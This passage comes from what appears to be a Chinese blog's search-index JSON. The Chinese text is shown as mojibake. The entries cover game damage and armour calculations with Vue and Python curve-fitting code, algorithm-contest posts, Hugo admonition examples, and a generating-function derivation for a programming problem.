'è¯·é€‰æ‹©ä¼¤å®³ç±»å‹', trigger: 'change', }] }) const weapons = [{ name: 'ç ´å¿ƒâ…¡', damage: 1070, }, { name: 'ç¥¥äº‘è‡ªç”±ä¹‹é¹°â…£', damage: 1012, }, { name: 'DSR-7', damage: 1010, }, { name: 'ç¥¥äº‘è‡ªç”±ä¹‹é¹°â…¢', damage: 1009, }, { name: 'éŸ³éšœçªç ´/é­”é¾™ä¹‹å»â…¢', damage: 1008, }, { name: 'ç ´å¿ƒ-å¤å­£PKç‰¹åˆ«ç‰ˆ', damage: 1003, }, { name: 'ç ´å¿ƒ', damage: 995, }, { name: 'S224EV-DZ', damage: 987, } ] function Ar (x) { return 29.11 * Math.log(x + 170.83) - 149.86; } const show = ref(false) const damage = ref(0) const calc = async (formRef) =\u003e { await formRef.validate((valid) =\u003e { if (valid) { let addDamage = info.level * info.weapon.damage * 0.01; addDamage = parseFloat(addDamage.toFixed(2)); let weaponDamage = info.Critical * (info.weapon.damage + addDamage + info.addDamage); weaponDamage *= parseFloat(((100 + info.damageFloat) * 0.01).toFixed(2)) weaponDamage = parseFloat(weaponDamage.toFixed(2)); let armour = (100.0 - Ar(Math.max(info.Armor - info.breakArmor, 0.0))) * 0.01; armour = parseFloat(armour.toFixed(2)); damage.value = (armour * weaponDamage).toFixed(2); show.value = true; } }) } \u003c/script\u003e ","date":"2024-10-20","objectID":"/posts/game%E5%88%9B%E6%83%B3%E5%85%B5%E5%9B%A2%E4%B8%80%E6%9E%AA%E4%BC%A4%E5%AE%B3%E8%AE%A1%E7%AE%97/:1:0","tags":["è®¡ç®—"],"title":"åˆ›æƒ³å…µå›¢ä¸€æªä¼¤å®³è®¡ç®—","uri":"/posts/game%E5%88%9B%E6%83%B3%E5%85%B5%E5%9B%A2%E4%B8%80%E6%9E%AA%E4%BC%A4%E5%AE%B3%E8%AE%A1%E7%AE%97/"},{"categories":["æ¸¸æˆ"],"content":" ç»“è®º $$ y = 29.11 \\log(x + 170.83) - 149.86 $$ è®¡ç®— æ•°æ®é›† æŠ¤ç”²å€¼ æ‰¿ä¼¤ç™¾åˆ†æ¯” 0 0 14 2.2 15 2.3 20 3.1 25 3.8 26 3.9 28 4.2 30 4.5 35 5.2 40 5.9 45 6.6 46 6.7 49 7.1 50 7.2 55 7.9 60 8.5 64 9 65 9.1 66 9.2 68 9.5 70 9.7 75 10.3 80 10.9 81 11.1 85 11.5 90 12.1 94 12.5 95 12.6 100 13.2 102 13.4 105 13.7 106 13.8 110 14.2 118 15.1 119 15.2 120 15.3 125 15.8 130 16.3 135 16.7 140 17.2 144 17.6 145 17.7 146 17.8 149 18.1 150 18.1 153 18.4 154 18.5 155 18.6 158 18.9 160 19 165 19.5 166 19.6 168 19.7 169 19.8 170 19.9 174 20.3 175 20.3 176 20.4 178 20.6 179 20.7 180 20.8 183 21 184 21.1 185 21.2 188 21.4 189 21.5 190 21.6 192 21.8 193 21.9 194 21.9 195 22 196 22.1 200 22.4 202 22.5 204 22.7 205 22.8 207 23 209 23.1 210 23.2 212 23.3 215 23.5 217 23.7 218 23.8 220 23.9 222 24.1 223 24.1 225 24.3 226 24.4 227 24.5 228 24.6 230 24.6 231 24.7 232 24.8 233 24.9 235 25 238 25.2 239 25.3 240 25.4 241 25.4 245 25.7 246 25.8 247 25.9 250 26.1 252 26.2 257 26.5 258 26.6 260 26.7 263 26.9 264 27 268 27.3 274 27.6 279 28 285 28.3 288 28.5 290 28.7 296 29 298 29.1 301 29.3 307 29.7 328 30.8 329 30.9 342 31.7 ","date":"2024-08-28","objectID":"/posts/game%E5%88%9B%E6%83%B3%E5%85%B5%E5%9B%A2%E6%8A%A4%E7%94%B2%E5%87%BD%E6%95%B0%E6%8B%9F%E5%90%88/:0:0","tags":["æ‹Ÿåˆ"],"title":"åˆ›æƒ³å…µå›¢æŠ¤ç”²å‡½æ•°æ‹Ÿåˆ","uri":"/posts/game%E5%88%9B%E6%83%B3%E5%85%B5%E5%9B%A2%E6%8A%A4%E7%94%B2%E5%87%BD%E6%95%B0%E6%8B%9F%E5%90%88/"},{"categories":["æ¸¸æˆ"],"content":"ä»£ç ï¼š import pandas as pd import numpy as np import matplotlib.pyplot as plt from scipy.optimize import curve_fit import pylab as mpl mpl.rcParams['font.sans-serif'] = ['SimHei'] # è§£å†³ä¸­æ–‡ä¸æ˜¾ç¤ºé—®é¢˜ plt.rcParams['axes.unicode_minus'] = False #è§£å†³è´Ÿæ•°åæ ‡æ˜¾ç¤ºé—®é¢˜ data = pd.read_csv('./data2.csv') x_data = data['value'] y_data = data['armour'] def fitting_function(x, a, b, c): return a * np.log(x + b) + c # è¿›è¡Œæ›²çº¿æ‹Ÿåˆ popt, pcov = curve_fit(fitting_function, x_data, y_data) # è·å–æ‹Ÿåˆå‚æ•° a_fit, b_fit, c_fit = popt # ç”Ÿæˆæ‹Ÿåˆæ›²çº¿çš„ x å€¼èŒƒå›´ x_fit = x_data # è®¡ç®—æ‹Ÿåˆæ›²çº¿çš„ y å€¼ y_fit = fitting_function(x_fit, a_fit, b_fit, c_fit) # ç»˜åˆ¶åŸå§‹æ•°æ®å’Œæ‹Ÿåˆæ›²çº¿ plt.scatter(x_data, y_data, label='åŸå§‹æ•°æ®') plt.plot(x_fit, y_fit, color='red', label='æ‹Ÿåˆæ›²çº¿') # æ·»åŠ æ‹Ÿåˆè¡¨è¾¾å¼æ–‡æœ¬ fit_expression = f\"y = {a_fit:.2f} * log(x + {b_fit:.2f}) {c_fit:.2f}\" plt.text(min(x_data), max(y_data), fit_expression, fontsize=12, color='green') plt.xlabel('æŠ¤ç”²å€¼') plt.ylabel('æ‰¿ä¼¤ç™¾åˆ†æ¯”') plt.legend() plt.show() ","date":"2024-08-28","objectID":"/posts/game%E5%88%9B%E6%83%B3%E5%85%B5%E5%9B%A2%E6%8A%A4%E7%94%B2%E5%87%BD%E6%95%B0%E6%8B%9F%E5%90%88/:1:0","tags":["æ‹Ÿåˆ"],"title":"åˆ›æƒ³å…µå›¢æŠ¤ç”²å‡½æ•°æ‹Ÿåˆ","uri":"/posts/game%E5%88%9B%E6%83%B3%E5%85%B5%E5%9B%A2%E6%8A%A4%E7%94%B2%E5%87%BD%E6%95%B0%E6%8B%9F%E5%90%88/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"æˆ‘ä»¬å·²ç»å¤§å››äº†ï¼Œè¿˜æœ‰æœºä¼šæ‹¿é‡‘ç‰Œå—ï¼Ÿ å¦‚ä½•è¯„ä»·2024CCPCé•¿æ˜¥é‚€è¯·èµ›æš¨å‰æ—çœèµ›? ","date":"2024-05-20","objectID":"/posts/cp2024ccpc%E9%95%BF%E6%98%A5%E9%82%80%E8%AF%B7%E8%B5%9B%E6%B8%B8%E8%AE%B0/:0:0","tags":["å°ä½œæ–‡"],"title":"2024CCPCé•¿æ˜¥é‚€è¯·èµ›æ¸¸è®°","uri":"/posts/cp2024ccpc%E9%95%BF%E6%98%A5%E9%82%80%E8%AF%B7%E8%B5%9B%E6%B8%B8%E8%AE%B0/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"å¤§æ¦‚æ˜¯æˆ‘ä»¬åŠè¿‡æœ€å¥½çš„ä¸€æ¬¡æ¯”èµ›äº†ã€‚ æ ¡å†…æ­£å¼èµ›é“¾æ¥ é‡ç°èµ›é“¾æ¥ ç‰›å®¢é“¾æ¥ æ¦œå•é“¾æ¥ æ ¡èµ›å›æ”¾åˆé›† é¢˜é¢ é¢˜è§£ ","date":"2024-05-13","objectID":"/posts/cp16%E5%B1%8A%E6%A0%A1%E8%B5%9B/:0:0","tags":["æ¯”èµ›"],"title":"å±±ä¸œç†å·¥å¤§å­¦ç¬¬åå…­å±ŠACMç¨‹åºè®¾è®¡ç«èµ›","uri":"/posts/cp16%E5%B1%8A%E6%A0%A1%E8%B5%9B/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"å‡ºçš„æ¯”è¾ƒæ»¡æ„çš„ä¸€æ¬¡æ¯”èµ›ã€‚åœ¨å¤§ä¸€çš„æ—¶å€™å°±æ³¨æ„åˆ° OJ æœ‰æ„šäººèŠ‚ä¸“åœºèµ›ï¼Œå‘ç°åšèµ·æ¥éå¸¸æœ‰æ„æ€ï¼Œå¯æƒœä¹‹åå­¦é•¿å°±ä¸åŠäº†ã€‚ åœ¨ 2024.3 çš„æ—¶å€™çªå‘å¥‡æƒ³ï¼Œæƒ³å…¨ç¨‹è‡ªå·±åŠä¸€æ¬¡æ„šäººèŠ‚ä¸“åœºèµ›ï¼Œäºæ˜¯å¼€å§‹æƒ³ ideaï¼š A é¢˜ idea æ˜¯è”šè“èµ›åŸç¥èµ›åºŸæ¡ˆï¼Œç®—æ˜¯å°æ´»ã€‚ B é¢˜ idea æ˜¯æˆ‘ä¹‹å‰æƒ³æ•´æ´»ä¸€ä¸ªå†—æ‚çš„æ•°å­¦å¼å­ï¼Œäºæ˜¯éšä¾¿å†™äº†ç‚¹å…¬å¼ã€‚ C é¢˜ idea ä¹Ÿæ¥è‡ªäºè”šè“èµ›åŸç¥èµ›ï¼Œç„¶åæƒ³åˆ°æ„šäººèŠ‚æœ‰ä¸€ä¸ª 'ï¼Œæç“¦ç‰¹è¯­æ²¡æœ‰å¯¹åº”å­—ç¬¦ï¼Œäºæ˜¯è€ƒå¯Ÿé€‰æ‰‹è‹±æ–‡èŠ‚æ—¥æ‹¼å†™ï¼ˆï¼‰ D é¢˜ idea æ˜¯ä»¥å‰æ‰“ PTA æ—¶æƒ³åˆ°çš„äº¤äº’æµ‹æ ·ä¾‹ã€‚ E é¢˜ idea æ¥è‡ªäº OJ æ”¯æŒè¿›å…¥é¢˜ç›®è‡ªåŠ¨æ’­æ”¾ BGMï¼Œäºæ˜¯æƒ³åˆ°äº†çŒœ BV å· F é¢˜ idea æ¥è‡ªäºæ–‡ä»¶å¤¹çš„æ ‘å½¢ç»“æ„ï¼Œç„¶åä¸¤ä¸ªå¶å­èŠ‚ç‚¹æš—ç¤ºæ‰¾ LCA G é¢˜ idea æ¥è‡ªäºç‰›å®¢é™¤å¤•èµ›ã€‚ H é¢˜ idea æ„æ€äº†å¾ˆä¹…ï¼Œç®—æ˜¯æ¯”è¾ƒæ»¡æ„ã€‚ I é¢˜ idea æ¥è‡ªäºé€šè¿‡ URL è¿›å…¥éšè—æ¯”èµ›ã€‚ç„¶åé¢˜é¢ä¹Ÿæ˜¯ç¨å¾®æ•´æ´»äº†ä¸€ä¸‹ã€‚æç¤ºéå¸¸æœ‰ç”¨ï¼Œæš—ç¤º URLï¼ J é¢˜ idea æ¥è‡ªäºæˆ‘æ£€ç´¢é¢˜ç›®ï¼Œäºæ˜¯ç»™é€‰æ‰‹æ•´ä¸€é“æ£€ç´¢é¢˜ã€‚ K é¢˜ idea æ¥è‡ªäºè´¨å› æ•°åˆ†è§£ï¼Œè¿˜æœ‰æ ‡é¢˜ reverse çš„ç»å…¸ trick L é¢˜ idea ä¹Ÿæ˜¯è´¨å› æ•°åˆ†è§£ï¼Œè¿˜æœ‰ä½¿ç”¨ oeis é‡ç°èµ›é“¾æ¥ é¢˜è§£ ","date":"2024-04-01","objectID":"/posts/cp2024%E6%84%9A%E4%BA%BA%E8%8A%82%E4%B8%93%E5%9C%BA%E8%B5%9B/:0:0","tags":["æ¯”èµ›"],"title":"2024æ„šäººèŠ‚ä¸“åœºèµ›","uri":"/posts/cp2024%E6%84%9A%E4%BA%BA%E8%8A%82%E4%B8%93%E5%9C%BA%E8%B5%9B/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"æ¯”èµ›é“¾æ¥ ","date":"2024-02-03","objectID":"/posts/cp%E8%94%9A%E8%93%9Dr2/:0:0","tags":["æ¯”èµ›"],"title":"[è”šè“ç³»åˆ—èµ› Azur Series - Sponsored by BLue] Round 2","uri":"/posts/cp%E8%94%9A%E8%93%9Dr2/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä¸€æ¬¡ 2023 çº§å¯’å‡é›†è®­çš„è®²è¯¾ï¼Œåšçš„éå¸¸è®¤çœŸçš„ä¸€æ¬¡ PPTï¼Œå°†æˆ‘æ‰€çŸ¥é“çš„ç®—æ³•ç«èµ›ä¿¡æ¯éƒ½å†™ä¸Šäº†ã€‚ ","date":"2024-01-14","objectID":"/posts/cp%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E5%85%A5%E9%97%A8%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF/:0:0","tags":["åŸºæœ¬ä¿¡æ¯"],"title":"ç®—æ³•ç«èµ›å…¥é—¨åŸºæœ¬ä¿¡æ¯","uri":"/posts/cp%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E5%85%A5%E9%97%A8%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF/"},{"categories":["åšå®¢"],"content":"æ³¨æ„ {{\u003c admonition note \u003e}} ä¸€ä¸ª **æ³¨æ„** æ¨ªå¹… {{\u003c /admonition \u003e}} æ³¨æ„ ä¸€ä¸ª æ³¨æ„ æ¨ªå¹… ","date":"2024-01-01","objectID":"/posts/blogadmonition/:1:0","tags":["åšå®¢è¯­æ³•"],"title":"åšå®¢ admonition","uri":"/posts/blogadmonition/"},{"categories":["åšå®¢"],"content":"æŠ€å·§ {{\u003c admonition tip \u003e}} ä¸€ä¸ª **æŠ€å·§** æ¨ªå¹… {{\u003c /admonition \u003e}} æŠ€å·§ ä¸€ä¸ª æç¤º æ¨ªå¹… ","date":"2024-01-01","objectID":"/posts/blogadmonition/:2:0","tags":["åšå®¢è¯­æ³•"],"title":"åšå®¢ admonition","uri":"/posts/blogadmonition/"},{"categories":["åšå®¢"],"content":"æ‘˜è¦ {{\u003c admonition abstract \u003e}} ä¸€ä¸ª **æ‘˜è¦** æ¨ªå¹… {{\u003c /admonition \u003e}} æ‘˜è¦ ä¸€ä¸ª æ‘˜è¦ æ¨ªå¹… ","date":"2024-01-01","objectID":"/posts/blogadmonition/:3:0","tags":["åšå®¢è¯­æ³•"],"title":"åšå®¢ admonition","uri":"/posts/blogadmonition/"},{"categories":["åšå®¢"],"content":"ä¿¡æ¯ {{\u003c admonition info \u003e}} ä¸€ä¸ª **ä¿¡æ¯** æ¨ªå¹… {{\u003c /admonition \u003e}} ä¿¡æ¯ ä¸€ä¸ª ä¿¡æ¯ æ¨ªå¹… ","date":"2024-01-01","objectID":"/posts/blogadmonition/:4:0","tags":["åšå®¢è¯­æ³•"],"title":"åšå®¢ admonition","uri":"/posts/blogadmonition/"},{"categories":["åšå®¢"],"content":"æˆåŠŸ {{\u003c admonition success \u003e}} ä¸€ä¸ª **æˆåŠŸ** æ¨ªå¹… {{\u003c /admonition \u003e}} æˆåŠŸ ä¸€ä¸ª æˆåŠŸ æ¨ªå¹… ","date":"2024-01-01","objectID":"/posts/blogadmonition/:5:0","tags":["åšå®¢è¯­æ³•"],"title":"åšå®¢ admonition","uri":"/posts/blogadmonition/"},{"categories":["åšå®¢"],"content":"é—®é¢˜ {{\u003c admonition question \u003e}} ä¸€ä¸ª **é—®é¢˜** æ¨ªå¹… {{\u003c /admonition \u003e}} é—®é¢˜ ä¸€ä¸ª é—®é¢˜ æ¨ªå¹… ","date":"2024-01-01","objectID":"/posts/blogadmonition/:6:0","tags":["åšå®¢è¯­æ³•"],"title":"åšå®¢ admonition","uri":"/posts/blogadmonition/"},{"categories":["åšå®¢"],"content":"è­¦å‘Š {{\u003c admonition warning \u003e}} ä¸€ä¸ª **è­¦å‘Š** æ¨ªå¹… {{\u003c /admonition \u003e}} è­¦å‘Š ä¸€ä¸ª è­¦å‘Š æ¨ªå¹… ","date":"2024-01-01","objectID":"/posts/blogadmonition/:7:0","tags":["åšå®¢è¯­æ³•"],"title":"åšå®¢ admonition","uri":"/posts/blogadmonition/"},{"categories":["åšå®¢"],"content":"å¤±è´¥ {{\u003c admonition failure \u003e}} ä¸€ä¸ª **å¤±è´¥** æ¨ªå¹… {{\u003c /admonition \u003e}} å¤±è´¥ ä¸€ä¸ª å¤±è´¥ æ¨ªå¹… ","date":"2024-01-01","objectID":"/posts/blogadmonition/:8:0","tags":["åšå®¢è¯­æ³•"],"title":"åšå®¢ admonition","uri":"/posts/blogadmonition/"},{"categories":["åšå®¢"],"content":"å±é™© {{\u003c admonition danger \u003e}} ä¸€ä¸ª **å±é™©** æ¨ªå¹… {{\u003c /admonition \u003e}} å±é™© ä¸€ä¸ª å±é™© æ¨ªå¹… ","date":"2024-01-01","objectID":"/posts/blogadmonition/:9:0","tags":["åšå®¢è¯­æ³•"],"title":"åšå®¢ admonition","uri":"/posts/blogadmonition/"},{"categories":["åšå®¢"],"content":"bug {{\u003c admonition bug \u003e}} ä¸€ä¸ª **bug** æ¨ªå¹… {{\u003c /admonition \u003e}} Bug ä¸€ä¸ª bug æ¨ªå¹… ","date":"2024-01-01","objectID":"/posts/blogadmonition/:10:0","tags":["åšå®¢è¯­æ³•"],"title":"åšå®¢ admonition","uri":"/posts/blogadmonition/"},{"categories":["åšå®¢"],"content":"ç¤ºä¾‹ {{\u003c admonition example \u003e}} ä¸€ä¸ª **ç¤ºä¾‹** æ¨ªå¹… {{\u003c /admonition \u003e}} ç¤ºä¾‹ ä¸€ä¸ª ç¤ºä¾‹ æ¨ªå¹… ","date":"2024-01-01","objectID":"/posts/blogadmonition/:11:0","tags":["åšå®¢è¯­æ³•"],"title":"åšå®¢ admonition","uri":"/posts/blogadmonition/"},{"categories":["åšå®¢"],"content":"å¼•ç”¨ {{\u003c admonition quote \u003e}} ä¸€ä¸ª **å¼•ç”¨** æ¨ªå¹… {{\u003c /admonition \u003e}} å¼•ç”¨ ä¸€ä¸ª å¼•ç”¨ æ¨ªå¹… ","date":"2024-01-01","objectID":"/posts/blogadmonition/:12:0","tags":["åšå®¢è¯­æ³•"],"title":"åšå®¢ admonition","uri":"/posts/blogadmonition/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"æ¯”èµ›é“¾æ¥(div.1) æ¯”èµ›é“¾æ¥(div.2) ","date":"2023-12-17","objectID":"/posts/cp%E8%94%9A%E8%93%9Dr1/:0:0","tags":["æ¯”èµ›"],"title":"[è”šè“ç³»åˆ—èµ› Azur Series - Sponsored by bLue] Round 1","uri":"/posts/cp%E8%94%9A%E8%93%9Dr1/"},{"categories":["æ¸¸æˆ"],"content":"å‡è®¾åˆ†è§£æœä»äºŒé¡¹åˆ†å¸ƒï¼Œè®¾åˆ†è§£çš„ç»¿æ­¦ä¸º $n$ ä¸ªï¼Œåˆ†è§£åˆ°ææ–™çš„æ¦‚ç‡ä¸º $p$ï¼Œé‚£ä¹ˆåˆ†è§£åˆ°é‡‘å¸çš„æ¦‚ç‡å°±ä¸º $1 - p$ï¼Œåˆ™è·å¾—ææ–™çš„æœŸæœ›ä¸º $n \\times p$ï¼Œè·å¾—é‡‘å¸çš„æœŸæœ›ä¸º $1000 \\times n \\times (1 - p)$ï¼Œé‚£ä¹ˆæ¶ˆè€—çš„æ€»é‡‘å¸ä¸º $2400 \\times n - 1000 \\times n \\times (1 - p)$ å‡è®¾ä¸€ä¸‡é‡‘å¸ä»·å€¼ä¸º $x$ å…‘æ¢åˆ¸ï¼Œä¸€ä¸ªææ–™ä»·å€¼ä¸º $y$ å…‘æ¢åˆ¸ï¼Œé‚£ä¹ˆæˆæœ¬ä»·ä¸º $\\dfrac{2400 \\times n - 1000 \\times n \\times (1 - p)}{10000} x$ æ”¶ç›Šä»·ä¸º $n \\times p \\times y$ è§£ä¸ç­‰å¼ $$\\frac{2400 \\times n - 1000 \\times n \\times (1 - p)}{10000} \\times x \\le n \\times p \\times y \\Leftrightarrow \\frac{0.14 x}{y - 0.1x} \\le p $$ å‡è®¾ $x = 3, y = 2$ï¼Œå¯çŸ¥æ¦‚ç‡å¤§çº¦ $p$ åœ¨ $24.7%$ æ¦‚ç‡å¯ä»¥ç›ˆåˆ©ã€‚ ","date":"2023-11-10","objectID":"/posts/game%E5%88%9B%E6%83%B3%E5%85%B5%E5%9B%A2%E7%BB%BF%E6%AD%A6%E5%88%86%E8%A7%A3%E8%AE%A1%E7%AE%97/:0:0","tags":["è®¡ç®—"],"title":"åˆ›æƒ³å…µå›¢ç»¿æ­¦åˆ†è§£è®¡ç®—","uri":"/posts/game%E5%88%9B%E6%83%B3%E5%85%B5%E5%9B%A2%E7%BB%BF%E6%AD%A6%E5%88%86%E8%A7%A3%E8%AE%A1%E7%AE%97/"},{"categories":["æ¸¸æˆ"],"content":"è“è‰²æ­¦å™¨ç»éªŒ:2500 ç´«è‰²æ­¦å™¨ç»éªŒ:12000 (å‡ä½¿ç”¨è“ç“¶) åŒåæ­¦å™¨ç»éªŒ1.5å€ è“è‰²æ­¦å™¨ ç´«è‰²æ­¦å™¨ ç­‰çº§ ç»éªŒ æ€»ç»éªŒ ç»éªŒ æ€»ç»éªŒ 0~1 1000 1000 2000 2000 1~2 1500 2500 3000 5000 2~3 2000 4500 4000 9000 3~4 2500 7000 5000 14000 4~5 3000 10000 6000 20000 5~6 4000 14000 12000 32000 6~7 7500 21500 18000 50000 7~8 10000 31500 24000 74000 8~9 12500 44000 31000 105000 9~10 14500 58500 37000 142000 10~11 26000 84500 77000 219000 11~12 37500 122000 117000 336000 12~13 48500 170500 156000 492000 13~14 60000 230500 196000 688000 14~15 71000 301500 236000 924000 15~16 124000 426500 487000 1411000 16~17 179000 605500 738000 2149000 17~18 233000 838500 990000 3139000 18~19 286500 1125000 1241000 4380000 19~20 340500 1465500 1492000 5872000 ","date":"2023-10-26","objectID":"/posts/game%E5%88%9B%E6%83%B3%E5%85%B5%E5%9B%A2%E6%AD%A6%E5%99%A8%E5%BC%BA%E5%8C%96%E7%BB%8F%E9%AA%8C%E8%A1%A8/:1:0","tags":["è¡¨æ ¼"],"title":"åˆ›æƒ³å…µå›¢æ­¦å™¨å¼ºåŒ–ç»éªŒè¡¨","uri":"/posts/game%E5%88%9B%E6%83%B3%E5%85%B5%E5%9B%A2%E6%AD%A6%E5%99%A8%E5%BC%BA%E5%8C%96%E7%BB%8F%E9%AA%8C%E8%A1%A8/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"å¾ˆæœ‰çºªå¿µæ„ä¹‰çš„ä¸€æ¬¡æ´»åŠ¨ã€‚ è§†é¢‘åˆé›† é‡ç°èµ›é“¾æ¥ æ¦œå•é“¾æ¥ é€Ÿè§ˆ ","date":"2023-10-15","objectID":"/posts/cpsdutacm15%E5%91%A8%E5%B9%B4/:0:0","tags":["æ¯”èµ›"],"title":"SDUTACM 15 å‘¨å¹´","uri":"/posts/cpsdutacm15%E5%91%A8%E5%B9%B4/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åšå®¢é“¾æ¥ ","date":"2023-09-01","objectID":"/posts/cpjiangly%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/:0:0","tags":["æ¨¡æ¿"],"title":"jiangly ç®—æ³•æ¨¡æ¿","uri":"/posts/cpjiangly%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸé¢˜é“¾æ¥ é¢˜æ„ å®šä¹‰å‡½æ•° $f_k(x) = (x ^ 2 - 1)f' _{k - 1}(x)$ï¼Œå…¶ä¸­ $f_0(x) = x$ï¼Œæ±‚ $f_n(x_0)$ å¯¹ $998,244,353$ å–æ¨¡ã€‚ $0\\le n \\le 2 \\times 10 ^ 5, 0 \\le x_0 \\le 998,244,352$ åˆ†æï¼š é¦–å…ˆçœ‹åˆ°é€’æ¨å¼å«æœ‰å¯¼æ•°ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘åºåˆ— $f_0(x),f_1(x),f_2(x),\\cdots$ çš„ EGFã€‚ç”±äº $x$ å˜é‡å·²å­˜åœ¨ï¼Œæˆ‘ä»¬ç”¨äºŒå…ƒå‡½æ•° $F(x, y)$ æ¥åˆ»ç”»ï¼Œå³ï¼š $$ F(x,y) = \\sum_{i = 0} ^ {\\infty}\\frac{f_i(x)}{i!} y ^ i $$ æˆ‘ä»¬å¸Œæœ›åœ¨ $F(x, y)$ ä¸­çœ‹åˆ° $fâ€™_i(x)$ï¼Œäºæ˜¯å¯¹ $F(x, y)$ æ±‚ä¸€æ¬¡ $x$ çš„åå¯¼ã€‚ $$ \\frac{\\partial F(x,y)}{\\partial x} = \\sum_{i = 0} ^ {\\infty}\\frac{fâ€™_i(x)}{i!} y ^ i $$ è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æŠŠ $f' _ {i}(x)$ æ›¿æ¢ä¸º $\\dfrac{f_{i + 1}(x)}{x ^ 2 - 1}$ (æ­¤æ—¶åˆ†æ¯å¿…ç„¶ä¸ä¸º $0$ï¼Œå¦åˆ™ä¸æ»¡è¶³æ ·ä¾‹è§£é‡Š) $$ \\frac{\\partial F(x,y)}{\\partial x} = \\sum_{i = 0} ^ {\\infty}\\frac{f_{i + 1}(x)}{(x ^ 2 - 1) \\times i!} y ^ i $$ æˆ‘ä»¬å¸Œæœ›å³è¾¹ä¹Ÿå‡‘æˆ $\\sum\\limits_{i = 0} ^ {\\infty}\\dfrac{f_i(x)}{i!} y ^ i$ï¼Œæ‰€ä»¥æŠŠ $(x ^ 2 - 1)$ ä¹˜åˆ°å·¦è¾¹ã€‚ $$ (x ^ 2 - 1)\\frac{\\partial F(x,y)}{\\partial x} = \\sum_{i = 0} ^ {\\infty}\\frac{f_{i + 1}(x)}{i!} y ^ i $$ æ­¤æ—¶å·®åˆ«ä¸º $f_{i + 1}(x)$ äº§ç”Ÿçš„é”™ä½ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¯¹ $F(x, y)$ æ±‚ä¸€æ¬¡ $y$ çš„åå¯¼ã€‚ $$ \\begin{array}{c} \u0026\u0026\\dfrac{\\partial F(x,y)}{\\partial y} \u0026=\u0026 \\sum\\limits_{i = 1} ^ {\\infty}\\dfrac{f_i(x)}{(i - 1)!} y ^ {i - 1} \\\\ \u0026\\Leftrightarrow\u0026 \\dfrac{\\partial F(x,y)}{\\partial y} \u0026=\u0026 \\sum\\limits_{i = 0} ^ {\\infty}\\dfrac{f_{i + 1}(x)}{i!} y ^ i \\end{array} $$ è¿™æ ·ä¸¤ä¸ªç­‰å¼å³è¾¹å°±ä¸€æ ·äº†ï¼Œäºæ˜¯ç›´æ¥è”ç«‹ã€‚ $$ \\frac{\\partial F(x,y)}{\\partial y} = (x ^ 2 - 1)\\frac{\\partial F(x,y)}{\\partial x} $$ é—®é¢˜å˜ä¸ºæ±‚è§£è¿™ä¸ªä¸€é˜¶çº¿æ€§åå¾®åˆ†æ–¹ç¨‹ï¼Œè€ƒè™‘ç”¨ç‰¹å¾çº¿æ³•ã€‚æ–¹ç¨‹æ”¹å†™ä¸ºï¼š $$ a(x,y,F)F_x+b(x,y,F)F_y=c(x,y,F) $$ å…¶ä¸­ $a(x,y,F) = 1 - x ^ 2, b(x,y,F) = 1,c(x,y,F) = 0$ï¼Œæ•…æœ‰ç‰¹å¾ç³»ç»Ÿï¼š $$ \\begin{array}{c} \\dfrac{\\mathrm{d}x}{\\mathrm{d}t} \u0026=\u0026 1 - x ^ 2 \u0026(1)\\\\ \\dfrac{\\mathrm{d}y}{\\mathrm{d}t} \u0026=\u0026 1 \u0026 (2) \\\\ \\dfrac{\\mathrm{d}F}{\\mathrm{d}t} \u0026=\u0026 0 \u0026 (3) \\end{array} $$ å°† $(1), (2)$ æ–¹ç¨‹è”ç«‹æ¶ˆæ‰ $\\mathrm{d}t$ å¾— $\\mathrm{d}y = \\dfrac{1}{1 - x ^ 2} \\mathrm{d}x$ï¼Œä¸¤è¾¹ç§¯åˆ†å¾— $2y + C_1 = \\ln\\left|\\dfrac{1 + x}{1 - x}\\right|$ å†ç”± $(3)$ å¾— $F = C_2$ï¼Œä¸ä¸Šå¼ç»“åˆå¾—ï¼š $$ F(x, y) = h\\left(\\ln\\left|\\dfrac{1 + x}{1 - x}\\right| - 2y\\right) $$ å…¶ä¸­ $h$ ä¸ºä»»æ„å‡½æ•°ï¼Œæ­¤æ—¶ç”±è¾¹ç•Œæ¡ä»¶ $F(x, 0) = x$ ä»£å…¥å¾—ï¼š $$ x = h\\left(\\ln\\left|\\dfrac{1 + x}{1 - x}\\right|\\right) $$ äºæ˜¯ä»¤ $u = \\ln\\left|\\dfrac{1 + x}{1 - x}\\right|$ï¼Œåè§£ $x$ å¾— $\\dfrac{e ^ u - 1}{e ^ u + 1} = x$ï¼Œæ‰€ä»¥ $h(u) = \\dfrac{e ^ u - 1}{e ^ u + 1}$ï¼Œå³ $h(x) = \\dfrac{e ^ x - 1}{e ^ x + 1}$ å°† $\\ln\\left|\\dfrac{1 + x}{1 - x}\\right| - 2y$ ä»£å…¥åˆ° $h(x)$ï¼Œæ•´ç†å‡º $F(x, y)$ï¼š $$ F(x, y) = \\dfrac{1 + x - (1 - x)e ^ {2y}}{1 + x + (1 - x)e ^ {2y}} $$ æ•… $$ \\dfrac{1 + x - (1 - x)e ^ {2y}}{1 + x + (1 - x)e ^ {2y}} = \\sum_{i = 0} ^ {\\infty}\\frac{f_i(x)}{i!} y ^ i $$ ç›´æ¥ä»£å…¥ $x_0$ å¹¶æ±‚ $f_n(x_0)$ï¼Œé‚£ä¹ˆç­”æ¡ˆå°±ä¸º $$ f_n(x_0) = n!\\times [y ^ n] \\left(\\dfrac{1 + x_0 - (1 - x_0) e ^ {2y}}{1 + x_0 + (1 - x_0)e ^ {2y}}\\right) $$ å±•å¼€ $e ^ {2y}$ åˆ° $n$ é¡¹ï¼Œè¿›è¡Œå¤šé¡¹å¼æ±‚é€†å†å·ç§¯å³å¯ã€‚ 